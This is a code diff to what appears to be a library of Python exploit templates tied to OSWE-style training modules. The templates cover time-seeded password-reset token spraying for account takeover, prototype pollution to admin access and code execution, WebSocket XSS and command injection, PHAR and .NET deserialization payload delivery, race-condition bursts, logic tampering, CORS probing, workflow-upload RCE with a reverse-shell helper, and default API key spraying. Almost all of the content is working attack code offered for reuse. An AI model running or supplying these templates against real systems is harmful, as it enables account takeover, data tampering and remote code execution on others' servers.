     aliases:["currenttimemillis","java random","opencrx","password reset","token spray","weak random","utc","timezone"],
     useWhen:"Reset token is generated from predictable time-seeded PRNG and confirm endpoint has no lockout. Epoch ms is timezone-independent; timezone only matters for manual human-readable timestamps.",
-    editFirst:["RESET_PATH","CONFIRM_PATH","TOKEN_LEN","SKEW_MS","MANUAL_TIMEZONE","FAIL_MARKER","PROVIDER","SEGMENT"],
+    editFirst:["RESET_PATH","CONFIRM_PATH","HEADERS","COOKIES","SESSION_COOKIES","TOKEN_LEN","SKEW_MS","MANUAL_TIMEZONE","FAIL_MARKER","PROVIDER","SEGMENT"],
     dependsOn:["helper-java-random-base62"],
     sourceRefs:["Notion module 6.2.5","challenge-62.py"],
     code:String.raw`def time_seeded_reset_takeover():
@@ -3430,6 +3561,9 @@ def java_base62(seed_ms, length=40):
     FAIL_MARKER = "Unable to reset password"                           # EDIT
     TARGET_USER = USERNAME                                             # EDIT via -u/--username
     NEW_PASSWORD = PASSWORD                                            # EDIT via -p/--password
+    HEADERS = {}                                                       # EDIT e.g. {"Authorization": "Basic BASE64_USER_COLON_PASS"}
+    COOKIES = {}                                                       # EDIT e.g. {"JSESSIONID": "REPLACE"}
+    SESSION_COOKIES = True                                             # EDIT True keeps s cookies from login; False = only COOKIES above
 
     def manual_time_to_ms(value):
         if value is None:
@@ -3462,7 +3596,7 @@ def java_base62(seed_ms, length=40):
 
     print("[*] requesting reset for", TARGET_USER)
     start_ms = int(time.time() * 1000) - SKEW_MS
-    r = s.post(url(RESET_PATH), data={"id": TARGET_USER}, timeout=TIMEOUT)
+    r = send_request("POST", RESET_PATH, data={"id": TARGET_USER}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     stop_ms = int(time.time() * 1000) + SKEW_MS
     manual_start = MANUAL_START_MS if MANUAL_START_MS is not None else MANUAL_START
     manual_stop = MANUAL_STOP_MS if MANUAL_STOP_MS is not None else MANUAL_STOP
@@ -3484,14 +3618,14 @@ def java_base62(seed_ms, length=40):
             "password1": NEW_PASSWORD,
             "password2": NEW_PASSWORD,
         }
-        rr = s.post(url(CONFIRM_PATH), data=payload, timeout=TIMEOUT)
+        rr = send_request("POST", CONFIRM_PATH, data=payload, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
         if FAIL_MARKER not in rr.text:
             print("[+] password reset accepted")
             print("[+] seed:", seed)
             print("[+] token:", token)
             print("[+] creds:", TARGET_USER, NEW_PASSWORD)
             if VERIFY_PATH:
-                vr = s.get(url(VERIFY_PATH.format(user=TARGET_USER, provider=PROVIDER, segment=SEGMENT)), auth=(TARGET_USER, NEW_PASSWORD), timeout=TIMEOUT)
+                vr = send_request("GET", VERIFY_PATH.format(user=TARGET_USER, provider=PROVIDER, segment=SEGMENT), headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
                 print("[verify]", vr.status_code)
             return token
     die("no token matched; widen SKEW_MS or use manual start/stop window")
@@ -3669,7 +3803,7 @@ public class JdbcSqlRunner {
     defaultFunction:"prototype_pollution_admin",
     aliases:["prototype pollution","node","__proto__","constructor","admin","rce"],
     useWhen:"Node app merges attacker JSON and a later endpoint reads polluted role/options.",
-    editFirst:["POLLUTE_PATH","TRIGGER_PATH","POLLUTION_BODY","SUCCESS_MARKER"],
+    editFirst:["POLLUTE_PATH","TRIGGER_PATH","HEADERS","COOKIES","SESSION_COOKIES","POLLUTION_BODY","SUCCESS_MARKER"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def prototype_pollution_admin():
@@ -3677,10 +3811,13 @@ public class JdbcSqlRunner {
     TRIGGER_PATH = "/admin"              # EDIT
     SUCCESS_MARKER = "Admin"             # EDIT
     POLLUTION_BODY = {"__proto__": {"isAdmin": True}}  # EDIT sink/property
+    HEADERS = {}                         # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                         # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True               # EDIT True keeps s cookies from login; False = only COOKIES above
 
-    r = s.post(url(POLLUTE_PATH), json=POLLUTION_BODY, timeout=TIMEOUT)
+    r = send_request("POST", POLLUTE_PATH, json_body=POLLUTION_BODY, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code < 500, "pollution request failed")
-    r = s.get(url(TRIGGER_PATH), timeout=TIMEOUT)
+    r = send_request("GET", TRIGGER_PATH, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(SUCCESS_MARKER in r.text or r.status_code in (200, 302), "pollution did not change access")
     print("[+] prototype pollution effect observed")
     return r
@@ -3742,7 +3879,7 @@ public class JdbcSqlRunner {
     defaultFunction:"prototype_token_pollute_trigger",
     aliases:["prototype pollution","token flow","rdp token","guaclite","websocket token","ejs rce","handlebars rce","chips"],
     useWhen:"App creates a connection/session token from attacker JSON, merges nested settings, then a later HTTP/WebSocket/render path consumes polluted prototype properties.",
-    editFirst:["TOKEN_PATH","POLLUTION_PATH","PAYLOAD_MODE","TOKEN_KEY","TRIGGER_PATHS","COMMAND"],
+    editFirst:["TOKEN_PATH","HEADERS","COOKIES","SESSION_COOKIES","POLLUTION_PATH","PAYLOAD_MODE","TOKEN_KEY","TRIGGER_PATHS","COMMAND"],
     dependsOn:["helper-prototype-pollution-payloads"],
     sourceRefs:["Notion Guacamole module","OSWE ch11"],
     code:String.raw`def prototype_token_pollute_trigger():
@@ -3762,6 +3899,9 @@ public class JdbcSqlRunner {
     TRIGGER_PATHS = ["/"]                      # EDIT pages/API paths that render template/read polluted property
     TOKEN_TRIGGER_PATHS = ["/api/connect?token={token}"]  # EDIT optional token-consuming paths
     SUCCESS_MARKERS = []                       # EDIT optional markers in response/log-facing output
+    HEADERS = {}                               # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                               # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                     # EDIT True keeps s cookies from login; False = only COOKIES above
 
     def deep_set(obj, path, value):
         cur = obj
@@ -3773,7 +3913,7 @@ public class JdbcSqlRunner {
     deep_set(body, POLLUTION_PATH, build_prototype_pollution_payload(PAYLOAD_MODE, COMMAND))
     dprint("pollution body:", json.dumps(body, indent=2))
 
-    r = s.post(url(TOKEN_PATH), json=body, timeout=TIMEOUT)
+    r = send_request("POST", TOKEN_PATH, json_body=body, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     print("[token]", r.status_code, r.text[:500])
     check(r.status_code < 500, "token/pollution request failed")
     token = None
@@ -3787,11 +3927,11 @@ public class JdbcSqlRunner {
 
     for path_tmpl in TOKEN_TRIGGER_PATHS:
         if token:
-            rr = s.get(url(path_tmpl.format(token=quote(token))), timeout=TIMEOUT)
+            rr = send_request("GET", path_tmpl.format(token=quote(token)), headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
             print("[token-trigger]", rr.status_code, rr.text[:300])
 
     for path in TRIGGER_PATHS:
-        rr = s.get(url(path), timeout=TIMEOUT)
+        rr = send_request("GET", path, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
         print("[trigger]", path, rr.status_code, rr.text[:300])
         if SUCCESS_MARKERS and any(x in rr.text for x in SUCCESS_MARKERS):
             return rr
@@ -3808,7 +3948,7 @@ public class JdbcSqlRunner {
     defaultFunction:"websocket_send_payload",
     aliases:["websocket","ws","send","chat","xss","stored xss","socket send","send-message","group_id","token query","json message","text message"],
     useWhen:"You need to send one payload over WebSocket, for example a stored XSS chat message delivered through a WS send endpoint.",
-    editFirst:["WS_PATH_OR_URL","QUERY","MESSAGE_MODE","TEXT_PAYLOAD","JSON_MESSAGE","ORIGIN","EXTRA_HEADERS"],
+    editFirst:["WS_PATH_OR_URL","QUERY","HEADERS","COOKIES","SESSION_COOKIES","MESSAGE_MODE","TEXT_PAYLOAD","JSON_MESSAGE","ORIGIN"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def websocket_send_payload():
@@ -3823,9 +3963,9 @@ public class JdbcSqlRunner {
         "group_id": "1",
     }
     ORIGIN = None                          # EDIT e.g. url("/") if server checks Origin
-    EXTRA_HEADERS = []                     # EDIT e.g. ["Authorization: Bearer TOKEN"]
-    USE_SESSION_COOKIES = True             # EDIT send current requests.Session cookies as Cookie header
-    USE_SESSION_AUTH = True                # EDIT copy s.headers["Authorization"] if present
+    HEADERS = {}                           # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                           # EDIT exact cookies to add to Cookie header
+    SESSION_COOKIES = True             # EDIT include current s.cookies in Cookie header
 
     MESSAGE_MODE = "text"                  # EDIT: text | json
     TEXT_PAYLOAD = "<img src=x onerror='alert(1)'>"  # EDIT stored XSS or raw WS text
@@ -3841,11 +3981,13 @@ public class JdbcSqlRunner {
     if clean_query:
         ws_url += ("&" if "?" in ws_url else "?") + urlencode(clean_query)
 
-    headers = list(EXTRA_HEADERS)
-    if USE_SESSION_AUTH and s.headers.get("Authorization"):
-        headers.append("Authorization: " + s.headers["Authorization"])
-    if USE_SESSION_COOKIES and s.cookies.get_dict():
-        cookie = "; ".join(f"{k}={v}" for k, v in s.cookies.get_dict().items())
+    headers = [f"{k}: {v}" for k, v in HEADERS.items()]
+    cookie_dict = {}
+    if SESSION_COOKIES:
+        cookie_dict.update(s.cookies.get_dict())
+    cookie_dict.update(COOKIES)
+    if cookie_dict:
+        cookie = "; ".join(f"{k}={v}" for k, v in cookie_dict.items())
         headers.append("Cookie: " + cookie)
 
     message = TEXT_PAYLOAD if MESSAGE_MODE == "text" else json.dumps(JSON_MESSAGE)
@@ -3879,7 +4021,7 @@ public class JdbcSqlRunner {
     defaultFunction:"websocket_json_trigger",
     aliases:["websocket","ws","json trigger","socket","second channel","message template"],
     useWhen:"Exploit trigger is a simple WebSocket JSON message rather than normal HTTP.",
-    editFirst:["WS_PATH_OR_URL","MESSAGE","EXPECT","ORIGIN"],
+    editFirst:["WS_PATH_OR_URL","HEADERS","COOKIES","SESSION_COOKIES","MESSAGE","EXPECT","ORIGIN"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def websocket_json_trigger():
@@ -3887,11 +4029,20 @@ public class JdbcSqlRunner {
 
     WS_PATH_OR_URL = "/ws"            # EDIT
     ORIGIN = None                     # EDIT: url("/") if server checks Origin
+    HEADERS = {}                      # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                      # EDIT exact cookies to add to Cookie header
+    SESSION_COOKIES = True            # EDIT include current s.cookies in Cookie header
     WS_URL = WS_PATH_OR_URL if WS_PATH_OR_URL.startswith("ws") else url(WS_PATH_OR_URL).replace("http://", "ws://", 1).replace("https://", "wss://", 1)
     MESSAGE = {"op": "ping"}          # EDIT
     EXPECT = "ok"                     # EDIT
 
-    header = []
+    header = [f"{k}: {v}" for k, v in HEADERS.items()]
+    cookie_dict = {}
+    if SESSION_COOKIES:
+        cookie_dict.update(s.cookies.get_dict())
+    cookie_dict.update(COOKIES)
+    if cookie_dict:
+        header.append("Cookie: " + "; ".join(f"{k}={v}" for k, v in cookie_dict.items()))
     ws = websocket.create_connection(WS_URL, timeout=TIMEOUT, origin=ORIGIN, header=header)
     ws.send(json.dumps(MESSAGE))
     data = ws.recv()
@@ -3910,7 +4061,7 @@ public class JdbcSqlRunner {
     defaultFunction:"websocket_task_trigger",
     aliases:["websocket","ws","task","akey","uniqid","sudo_server","json task","openitcockpit"],
     useWhen:"WebSocket protocol uses task/data/key/uniqid style JSON and the key was recovered manually or via XSS scrape.",
-    editFirst:["WS_PATH_OR_URL","KEY","TASK","DATA","EXPECT"],
+    editFirst:["WS_PATH_OR_URL","HEADERS","COOKIES","SESSION_COOKIES","KEY","TASK","DATA","EXPECT"],
     dependsOn:[],
     sourceRefs:["module 7 scripts","PDF module"],
     code:String.raw`def websocket_task_trigger():
@@ -3923,6 +4074,9 @@ public class JdbcSqlRunner {
     DATA = {}                          # EDIT task body
     EXPECT = ""                        # EDIT optional marker
     ORIGIN = None                      # EDIT: url("/") if server checks Origin
+    HEADERS = {}                       # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                       # EDIT exact cookies to add to Cookie header
+    SESSION_COOKIES = True             # EDIT include current s.cookies in Cookie header
     MESSAGE_TEMPLATE = {               # EDIT match observed Burp websocket shape
         "task": TASK,
         "data": DATA,
@@ -3931,7 +4085,14 @@ public class JdbcSqlRunner {
     }
 
     WS_URL = WS_PATH_OR_URL if WS_PATH_OR_URL.startswith("ws") else url(WS_PATH_OR_URL).replace("http://", "ws://", 1).replace("https://", "wss://", 1)
-    ws = websocket.create_connection(WS_URL, timeout=TIMEOUT, origin=ORIGIN)
+    header = [f"{k}: {v}" for k, v in HEADERS.items()]
+    cookie_dict = {}
+    if SESSION_COOKIES:
+        cookie_dict.update(s.cookies.get_dict())
+    cookie_dict.update(COOKIES)
+    if cookie_dict:
+        header.append("Cookie: " + "; ".join(f"{k}={v}" for k, v in cookie_dict.items()))
+    ws = websocket.create_connection(WS_URL, timeout=TIMEOUT, origin=ORIGIN, header=header)
     ws.send(json.dumps(MESSAGE_TEMPLATE))
     out = ws.recv()
     ws.close()
@@ -3980,7 +4141,7 @@ public class JdbcSqlRunner {
     defaultFunction:"run_cmd",
     aliases:["websocket rce","ws rce","command injection","check_http","su -c","akey","sudo_server"],
     useWhen:"RCE is reached by sending a command-shaped task over WebSocket, often after XSS leaked a key.",
-    editFirst:["WS_PATH_OR_URL","KEY","TASK","INJECTION_TEMPLATE","EXPECT"],
+    editFirst:["WS_PATH_OR_URL","HEADERS","COOKIES","SESSION_COOKIES","KEY","TASK","INJECTION_TEMPLATE","EXPECT"],
     dependsOn:[],
     sourceRefs:["module 7 scripts","PDF module"],
     code:String.raw`def run_cmd(cmd):
@@ -3993,6 +4154,9 @@ public class JdbcSqlRunner {
     TASK = "execute"                       # EDIT observed task name
     EXPECT = ""                            # EDIT optional marker in response
     ORIGIN = None                          # EDIT if server checks Origin
+    HEADERS = {}                           # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                           # EDIT exact cookies to add to Cookie header
+    SESSION_COOKIES = True                 # EDIT include current s.cookies in Cookie header
     SHELL_WRAP = "sh -c {quoted}"          # EDIT: linux shape; use "cmd /c {quoted}" for Windows
     INJECTION_TEMPLATE = "{cmd}"           # EDIT full vulnerable command/argument shape from Burp/source
 
@@ -4007,7 +4171,14 @@ public class JdbcSqlRunner {
     }
 
     WS_URL = WS_PATH_OR_URL if WS_PATH_OR_URL.startswith("ws") else url(WS_PATH_OR_URL).replace("http://", "ws://", 1).replace("https://", "wss://", 1)
-    ws = websocket.create_connection(WS_URL, timeout=TIMEOUT, origin=ORIGIN)
+    header = [f"{k}: {v}" for k, v in HEADERS.items()]
+    cookie_dict = {}
+    if SESSION_COOKIES:
+        cookie_dict.update(s.cookies.get_dict())
+    cookie_dict.update(COOKIES)
+    if cookie_dict:
+        header.append("Cookie: " + "; ".join(f"{k}={v}" for k, v in cookie_dict.items()))
+    ws = websocket.create_connection(WS_URL, timeout=TIMEOUT, origin=ORIGIN, header=header)
     ws.send(json.dumps(message))
     out = ws.recv()
     ws.close()
@@ -4026,7 +4197,7 @@ public class JdbcSqlRunner {
     defaultFunction:"second_order_trigger",
     aliases:["second order","stored payload","trigger","delayed exploit"],
     useWhen:"Payload is stored in one request and executed only after a later view/process request.",
-    editFirst:["STORE_PATH","TRIGGER_PATH","FIELD","PAYLOAD","SUCCESS_MARKER"],
+    editFirst:["STORE_PATH","TRIGGER_PATH","HEADERS","COOKIES","SESSION_COOKIES","FIELD","PAYLOAD","SUCCESS_MARKER"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def second_order_trigger():
@@ -4035,10 +4206,13 @@ public class JdbcSqlRunner {
     FIELD = "name"                # EDIT
     PAYLOAD = "PAYLOAD"           # EDIT
     SUCCESS_MARKER = "OSWE"       # EDIT
+    HEADERS = {}                  # EDIT exact headers
+    COOKIES = {}                  # EDIT exact cookies
+    SESSION_COOKIES = True    # EDIT False = no s.cookies, only COOKIES above
 
-    r = s.post(url(STORE_PATH), data={FIELD: PAYLOAD}, timeout=TIMEOUT)
+    r = send_request("POST", STORE_PATH, data={FIELD: PAYLOAD}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code in (200, 201, 302), "store request failed")
-    r = s.get(url(TRIGGER_PATH), timeout=TIMEOUT)
+    r = send_request("GET", TRIGGER_PATH, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(SUCCESS_MARKER in r.text or r.status_code < 500, "trigger did not show expected signal")
     print("[+] second-order trigger sent")
     return r
@@ -4053,7 +4227,7 @@ public class JdbcSqlRunner {
     defaultFunction:"race_burst",
     aliases:["race","parallel","thread","coupon","double spend","burst"],
     useWhen:"Logic bug depends on sending the same state-changing request many times concurrently.",
-    editFirst:["METHOD","PATH","BODY","THREADS","SUCCESS_MARKER"],
+    editFirst:["METHOD","PATH","HEADERS","COOKIES","SESSION_COOKIES","BODY","THREADS","SUCCESS_MARKER"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def race_burst():
@@ -4064,9 +4238,12 @@ public class JdbcSqlRunner {
     BODY = {"coupon": "X"}    # EDIT
     THREADS = 20              # EDIT
     SUCCESS_MARKER = "ok"     # EDIT
+    HEADERS = {}              # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}              # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True    # EDIT True keeps s cookies from login; False = only COOKIES above
 
     def one(i):
-        r = s.request(METHOD, url(PATH), json=BODY, timeout=TIMEOUT)
+        r = send_request(METHOD, PATH, json_body=BODY, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
         return i, r.status_code, SUCCESS_MARKER in r.text, r.text[:120]
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
@@ -4084,7 +4261,7 @@ public class JdbcSqlRunner {
     defaultFunction:"logic_negative_amount",
     aliases:["logic","negative amount","price","balance","parameter tamper"],
     useWhen:"Business logic accepts negative/zero/overflow numbers in price, quantity, credit, or balance flows.",
-    editFirst:["ENDPOINT","FIELD","VALUE","SUCCESS_MARKER"],
+    editFirst:["ENDPOINT","HEADERS","COOKIES","SESSION_COOKIES","FIELD","VALUE","SUCCESS_MARKER"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def logic_negative_amount():
@@ -4092,8 +4269,11 @@ public class JdbcSqlRunner {
     FIELD = "amount"           # EDIT
     VALUE = "-100"             # EDIT
     SUCCESS_MARKER = "success" # EDIT
+    HEADERS = {}               # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}               # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True     # EDIT True keeps s cookies from login; False = only COOKIES above
 
-    r = s.post(url(ENDPOINT), data={FIELD: VALUE}, timeout=TIMEOUT)
+    r = send_request("POST", ENDPOINT, data={FIELD: VALUE}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code < 500, "logic request failed")
     check(SUCCESS_MARKER in r.text or r.status_code in (200, 302), "logic signal missing")
     print("[+] logic tamper request accepted")
@@ -4149,7 +4329,7 @@ public class JdbcSqlRunner {
     defaultFunction:"trigger_phar_deserialization",
     aliases:["php","phar","pop chain","phpggc","deserialization","file_exists"],
     useWhen:"PHP file operation reaches phar:// path and metadata POP chain is prepared.",
-    editFirst:["UPLOAD_PATH","TRIGGER_PATH","FIELD","PHAR_PATH","TRIGGER_PARAM"],
+    editFirst:["UPLOAD_PATH","TRIGGER_PATH","HEADERS","COOKIES","SESSION_COOKIES","FIELD","PHAR_PATH","TRIGGER_PARAM"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def trigger_phar_deserialization():
@@ -4158,12 +4338,15 @@ public class JdbcSqlRunner {
     FIELD = "file"                           # EDIT
     PHAR_PATH = "payload.phar"               # EDIT generated with phpggc/custom POP
     TRIGGER_PARAM = "path"                   # EDIT
+    HEADERS = {}                             # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                             # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                   # EDIT True keeps s cookies from login; False = only COOKIES above
 
     with open(PHAR_PATH, "rb") as f:
-        r = s.post(url(UPLOAD_PATH), files={FIELD: ("a.jpg", f, "image/jpeg")}, timeout=TIMEOUT)
+        r = send_request("POST", UPLOAD_PATH, files={FIELD: ("a.jpg", f, "image/jpeg")}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code in (200, 201, 302), "phar upload failed")
 
-    r = s.get(url(TRIGGER_PATH), params={TRIGGER_PARAM: "phar://a.jpg"}, timeout=TIMEOUT)
+    r = send_request("GET", TRIGGER_PATH, params={TRIGGER_PARAM: "phar://a.jpg"}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code < 500, "phar trigger failed")
     print("[+] PHAR trigger sent")
     return r
@@ -4178,7 +4361,7 @@ public class JdbcSqlRunner {
     defaultFunction:"deliver_dotnet_deser_payload",
     aliases:["dotnet",".net","ysoserial.net","viewstate","binaryformatter","deserialization"],
     useWhen:".NET deserialization sink is confirmed and payload is generated with ysoserial.net or equivalent.",
-    editFirst:["ENDPOINT","FIELD","PAYLOAD_FILE","ENCODING"],
+    editFirst:["ENDPOINT","HEADERS","COOKIES","SESSION_COOKIES","FIELD","PAYLOAD_FILE","ENCODING"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def deliver_dotnet_deser_payload():
@@ -4186,6 +4369,9 @@ public class JdbcSqlRunner {
     FIELD = "data"                  # EDIT
     PAYLOAD_FILE = "payload.txt"    # EDIT output from ysoserial.net
     ENCODING = "text"               # EDIT: text/base64/raw
+    HEADERS = {}                    # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                    # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True          # EDIT True keeps s cookies from login; False = only COOKIES above
 
     mode = "rb" if ENCODING == "raw" else "r"
     with open(PAYLOAD_FILE, mode) as f:
@@ -4193,7 +4379,7 @@ public class JdbcSqlRunner {
     if ENCODING == "base64" and isinstance(payload, bytes):
         payload = base64.b64encode(payload).decode()
 
-    r = s.post(url(ENDPOINT), data={FIELD: payload}, timeout=TIMEOUT)
+    r = send_request("POST", ENDPOINT, data={FIELD: payload}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code < 500, ".NET deserialization delivery failed")
     print("[+] .NET payload delivered")
     return r
@@ -4553,7 +4739,7 @@ def hexlify(s):
     last = None
     for i in range(TRIES):
         try:
-            return s.request(method, url(path), timeout=TIMEOUT, **kwargs)
+            return send_request(method, path, **kwargs)
         except requests.RequestException as e:
             last = e
             print("[retry]", i + 1, e)
@@ -4678,7 +4864,7 @@ def hexlify(s):
     defaultFunction:"cors_misconfig_scan",
     aliases:["cors","acao","acac","preflight","reflected origin","module 9","concord"],
     useWhen:"Probe several endpoints with attacker/null/wildcard Origins to classify CORS risk before crafting a CSRF/CORS payload.",
-    editFirst:["CORS_PATHS","TEST_ORIGINS","METHODS"],
+    editFirst:["CORS_PATHS","TEST_ORIGINS","HEADERS","COOKIES","SESSION_COOKIES","METHODS"],
     dependsOn:[],
     sourceRefs:["OSWE module 9.2"],
     code:String.raw`def cors_misconfig_scan():
@@ -4689,16 +4875,20 @@ def hexlify(s):
         "null",
     ]
     METHODS = ["GET", "OPTIONS"]                      # EDIT add POST if needed
+    HEADERS = {}                                      # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                                      # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                            # EDIT True keeps s cookies from login; False = only COOKIES above
     out = []
     for p in CORS_PATHS:
-        full = p if p.startswith("http") else url(p)
+        target = p
         for origin in TEST_ORIGINS:
             for m in METHODS:
-                h = {"Origin": origin}
+                h = dict(HEADERS)
+                h["Origin"] = origin
                 if m == "OPTIONS":
                     h["Access-Control-Request-Method"] = "POST"
                     h["Access-Control-Request-Headers"] = "Authorization, Content-Type"
-                r = s.request(m, full, headers=h, timeout=TIMEOUT, allow_redirects=False)
+                r = send_request(m, target, headers=h, cookies=COOKIES, session_cookies=SESSION_COOKIES, allow_redirects=False)
                 acao = r.headers.get("Access-Control-Allow-Origin")
                 acac = (r.headers.get("Access-Control-Allow-Credentials") or "").lower()
                 reflected = (acao or "").strip() == origin
@@ -4759,7 +4949,7 @@ def hexlify(s):
     defaultFunction:"cors_samesite_preflight_check",
     aliases:["cors","samesite","preflight","simple request","credentials include","csrf","browser rules","module 9"],
     useWhen:"Need to decide if browser JS can send/read a cross-origin request: GET/POST simple requests, credentials, SameSite, and OPTIONS preflight.",
-    editFirst:["PATH","ORIGIN","METHOD","CONTENT_TYPE","COOKIE_HEADER"],
+    editFirst:["PATH","ORIGIN","HEADERS","COOKIES","SESSION_COOKIES","METHOD","CONTENT_TYPE","COOKIE_HEADER"],
     dependsOn:[],
     sourceRefs:["OSWE module 9.2"],
     code:String.raw`def cors_samesite_preflight_check():
@@ -4769,6 +4959,9 @@ def hexlify(s):
     CONTENT_TYPE = "multipart/form-data"          # EDIT browser body type
     COOKIE_HEADER = ""                            # EDIT paste Set-Cookie value if known
     REQUEST_HEADERS = ["Authorization", "Content-Type"]  # EDIT non-simple headers
+    HEADERS = {}                                  # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                                  # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                        # EDIT True keeps s cookies from login; False = only COOKIES above
 
     simple_types = {
         "application/x-www-form-urlencoded",
@@ -4791,16 +4984,18 @@ def hexlify(s):
         else:
             print("[cookie] no SameSite seen: behavior depends on browser/version")
 
-    h = {"Origin": ORIGIN}
-    r = s.get(url(PATH), headers=h, timeout=TIMEOUT, allow_redirects=False)
+    h = dict(HEADERS)
+    h["Origin"] = ORIGIN
+    r = send_request("GET", PATH, headers=h, cookies=COOKIES, session_cookies=SESSION_COOKIES, allow_redirects=False)
     print("[GET]", r.status_code, "ACAO=", r.headers.get("Access-Control-Allow-Origin"), "ACAC=", r.headers.get("Access-Control-Allow-Credentials"))
     if needs_preflight:
-        h = {
+        h = dict(HEADERS)
+        h.update({
             "Origin": ORIGIN,
             "Access-Control-Request-Method": METHOD.upper(),
             "Access-Control-Request-Headers": ", ".join(REQUEST_HEADERS),
-        }
-        r = s.options(url(PATH), headers=h, timeout=TIMEOUT, allow_redirects=False)
+        })
+        r = send_request("OPTIONS", PATH, headers=h, cookies=COOKIES, session_cookies=SESSION_COOKIES, allow_redirects=False)
         print("[OPTIONS]", r.status_code, "ACAO=", r.headers.get("Access-Control-Allow-Origin"), "ACAM=", r.headers.get("Access-Control-Allow-Methods"), "ACAH=", r.headers.get("Access-Control-Allow-Headers"))
     return True
 `
@@ -4899,7 +5094,7 @@ flows:
     defaultFunction:"workflow_api_upload_rce",
     aliases:["workflow","concord","concord.yml","api/v1/process","api key","authorization","yaml upload","groovy rce","module 9"],
     useWhen:"You have direct API auth/header and workflow upload endpoint accepts a YAML/script file that starts a process.",
-    editFirst:["PROCESS_PATH","FIELD","FILENAME","AUTH_HEADER","YAML_BODY"],
+    editFirst:["PROCESS_PATH","HEADERS","COOKIES","SESSION_COOKIES","FIELD","FILENAME","YAML_BODY"],
     dependsOn:["helper-workflow-yaml-revshell"],
     sourceRefs:["OSWE module 9.3"],
     code:String.raw`def workflow_api_upload_rce():
@@ -4907,17 +5102,16 @@ flows:
     FIELD = "concord.yml"                   # EDIT multipart field name
     FILENAME = "concord.yml"                # EDIT uploaded filename
     MIME = "application/yml"                # EDIT part MIME
-    AUTH_HEADER = ""                        # EDIT optional direct API key/token; empty uses current session headers
+    HEADERS = {}                            # EDIT e.g. {"Authorization": "REPLACE_API_KEY"}
+    COOKIES = {}                            # EDIT exact cookies
+    SESSION_COOKIES = True              # EDIT False = no s.cookies, only COOKIES above
     YAML_BODY = build_workflow_yaml_revshell()  # EDIT or replace with custom workflow YAML
     EXPECT = "instanceId"                   # EDIT marker in successful response
 
-    headers = {}
-    if AUTH_HEADER:
-        headers["Authorization"] = AUTH_HEADER
     files = {
         FIELD: (FILENAME, YAML_BODY.encode(), MIME),
     }
-    r = s.post(url(PROCESS_PATH), headers=headers, files=files, timeout=TIMEOUT)
+    r = send_request("POST", PROCESS_PATH, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, files=files)
     print("[process]", r.status_code, r.text[:500])
     check(r.status_code in (200, 201, 202) and ((not EXPECT) or EXPECT in r.text), "workflow upload did not look successful")
     return r
@@ -5081,8 +5275,8 @@ flows:
     chainRole:"auth",
     defaultFunction:"auth_default_apikey",
     aliases:["default credentials","apikey","authorization header","bearer","insecure defaults","concord 1.83","whitebox","module 9"],
-    useWhen:"Source review or migration grep revealed candidate default keys. Spray against the auth-check endpoint and persist the working header on the session.",
-    editFirst:["CHECK_PATH","CANDIDATES","HEADER_NAME","HEADER_PREFIX"],
+    useWhen:"Source review or migration grep revealed candidate default keys. Spray against the auth-check endpoint and return the working HEADERS dict.",
+    editFirst:["CHECK_PATH","HEADERS","COOKIES","SESSION_COOKIES","CANDIDATES","HEADER_NAME","HEADER_PREFIX"],
     dependsOn:[],
     sourceRefs:["OSWE module 9.3"],
     code:String.raw`def auth_default_apikey():
@@ -5093,15 +5287,18 @@ flows:
     ]
     HEADER_NAME = "Authorization"                     # EDIT some apps use X-Api-Key, X-Auth-Token
